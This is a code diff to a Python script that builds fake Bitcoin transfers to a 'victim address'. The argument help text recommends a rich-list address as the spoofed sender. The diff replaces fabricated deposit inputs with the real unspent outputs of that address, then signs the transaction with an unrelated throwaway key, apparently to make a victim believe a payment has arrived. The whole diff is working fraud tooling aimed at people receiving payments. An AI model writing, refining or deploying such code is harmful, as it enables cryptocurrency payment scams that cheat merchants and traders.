@@ -21,6 +21,9 @@ parser.add_argument("username",
 parser.add_argument("password",
                     help="Your BTC node password",
                     type=str)
+parser.add_argument("send_from",
+                    help="Fake send btc from address. (Recommend rich list.)",
+                    type=str)
 parser.add_argument("send_to",
                     help="Fake send btc to victim address.",
                     type=str)
@@ -60,6 +63,7 @@ rpc_port = args.node_port
 username = args.username
 password = args.password
 
+send_from = args.send_from
 victim_address   = args.send_to
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
@@ -72,27 +76,20 @@ print("OK")
 print()
 fake_from = Wallet()
 
-#inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
-
+inputs = transaction_util.unspent(send_from)
+balance = transaction_util.get_balance(send_from)["confirmed"]
 fake_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
-fake_inputs = [{'tx_hash': fake_hash,
-                'tx_pos': 1,
-                'height': 2870812, 
-                'value': 1000000000, # = 10 BTC(Fake)
-                'address': fake_from.address.mainnet.pubaddr1}]
-if testnet:
-    fake_inputs[0]["address"] = fake_from.address.testnet.pubaddr1
+#if testnet:
+#    fake_inputs[0]["address"] = fake_from.address.testnet.pubaddr1
 
-print(f"Fake Deposit Information : {fake_inputs}")
 if amount_btc > 10:
     print(f"[!] Fake remittance amount exceeds 10BTC.")
     exit()
 
-balance = fake_inputs[0]["value"]
 send_amount = to_satoshi(amount_btc)
 change_btc_amt = (balance - send_amount) #おつり
-tx_victim = [{"address": victim_address, "value": send_amount}, {"address": fake_inputs[0]["address"], "value": change_btc_amt}]
-tx_victim = transaction_util.mktx(fake_inputs, tx_victim)
+tx_victim = [{"address": victim_address, "value": send_amount}, {"address": inputs[0]["address"], "value": change_btc_amt}]
+tx_victim = transaction_util.mktx(inputs, tx_victim)
 tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.mainnet.wif))
 if testnet:
     tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.testnet.wif))
